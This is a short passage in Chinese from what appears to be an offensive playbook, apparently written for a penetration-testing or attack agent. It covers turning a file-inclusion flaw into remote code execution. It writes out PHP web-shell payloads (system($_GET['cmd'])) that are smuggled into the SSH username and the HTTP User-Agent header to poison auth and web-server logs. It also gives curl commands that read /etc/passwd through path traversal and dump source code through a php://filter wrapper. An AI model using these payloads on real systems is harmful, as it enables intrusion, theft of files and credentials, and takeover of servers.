...
▸ 文件包含（LFI/RFI）—— 深度遍历 + 文件枚举 + Wrapper RCE:
  ...
  SSH: sshpass -p x ssh '<?php system($_GET["cmd"]);?>'@TARGET → 包含 /var/log/auth.log
  Apache UA: curl -s "http://TARGET/" -H 'User-Agent: <?php system($_GET["cmd"]);?>' → 包含 /var/log/apache2/access.log
  Nginx UA: 同上 → 包含 /var/log/nginx/access.log
  包含时同样需要遍历多级 ../ 路径
...
场景6: 文件包含（LFI → RCE 链式攻击）
  curl -s "http://TARGET:PORT/page?file=../../../etc/passwd"
  curl -s "http://TARGET:PORT/page?file=/var/log/auth.log"
  （日志注入: ssh '<?php system($_GET["cmd"]); ?>'@TARGET 然后 LFI 包含 auth.log）
  curl -s "http://TARGET:PORT/page?file=php://filter/convert.base64-encode/resource=index"
